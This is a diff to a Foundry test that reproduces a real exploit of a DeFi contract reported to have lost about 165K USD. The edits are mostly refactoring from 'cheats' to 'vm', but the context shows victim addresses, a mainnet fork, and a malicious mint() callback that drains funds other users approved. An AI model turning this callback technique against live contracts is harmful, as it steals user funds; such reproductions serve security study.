@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~165K USD$
 // Attacker : https://etherscan.io/address/0xc0ccff0b981b419e6e47560c3659c5f0b00e4985
@@ -32,7 +31,6 @@ contract ContractTest is Test {
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 SHIB = IERC20(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);
     ICiv VulnerableContract = ICiv(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     address[] victims = [
         0x18b5f62c3830668D64F859A5a71511B2132075F1,
@@ -105,15 +103,15 @@ contract ContractTest is Test {
     uint256 private counter = 0;
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 17_646_141);
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(BONE), "BONE");
-        cheats.label(address(LEASH), "LEASH");
-        cheats.label(address(SANI), "SANI");
-        cheats.label(address(ONE), "ONE");
-        cheats.label(address(CELL), "CELL");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(SHIB), "SHIB");
+        vm.createSelectFork("mainnet", 17_646_141);
+        vm.label(address(USDT), "USDT");
+        vm.label(address(BONE), "BONE");
+        vm.label(address(LEASH), "LEASH");
+        vm.label(address(SANI), "SANI");
+        vm.label(address(ONE), "ONE");
+        vm.label(address(CELL), "CELL");
+        vm.label(address(USDC), "USDC");
+        vm.label(address(SHIB), "SHIB");
     }
 
     function testExploit() public {
@@ -157,13 +155,10 @@ contract ContractTest is Test {
 
     // Step 2. This function will be called from vulnerable contract (after step 1).
     // In the body of the function attacker call uniswapV3MintCallback() to transfer the funds approved by other users.
-    function mint(
-        address recipient,
-        int24 tickLower,
-        int24 tickUpper,
-        uint128 amount,
-        bytes calldata data
-    ) external returns (uint128 amount0, uint128 amount1) {
+    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
+        external
+        returns (uint128 amount0, uint128 amount1)
+    {
         if (counter == 0) {
             uniswapV3MintCallback(0);
         } else if (counter == 1) {
